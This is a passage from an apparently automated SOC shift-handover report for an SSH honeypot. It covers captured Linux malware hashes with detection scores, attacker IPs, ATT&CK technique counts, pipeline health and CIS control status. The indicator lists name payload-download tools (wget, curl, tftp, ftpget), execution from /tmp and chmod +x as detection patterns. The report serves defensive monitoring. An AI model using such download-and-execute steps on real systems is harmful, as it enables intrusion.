| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 55/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `58.34.174[.]90` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `31.173.66[.]222` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `223.25.108[.]2` | ID | PT Sinergi Semesta Telematika | **100** ⚠️ | 50 |
| `91.230.168[.]215` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `64.89.160[.]135` | LU | Ghosty Networks LLC | **100** ⚠️ | 50 |
| `60.175.91[.]53` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `91.238.181[.]94` | FR | VDS&VPN services | **100** ⚠️ | 50 |
| `66.132.172[.]110` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `186.215.107[.]189` | BR | Exponencial Serviços de Cons. e Asses. Ltda | **100** ⚠️ | 50 |
| `103.251.143[.]14` | IN | Fusionnet Web Services Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 151 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 2 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 216 cases |
| Tool 34  | Credential Extractor        | ✅ 182 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 94 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (9.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 151 priority case(s) shown individually · 22 recon entry/entries in table (9 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-23T21:08:47Z_
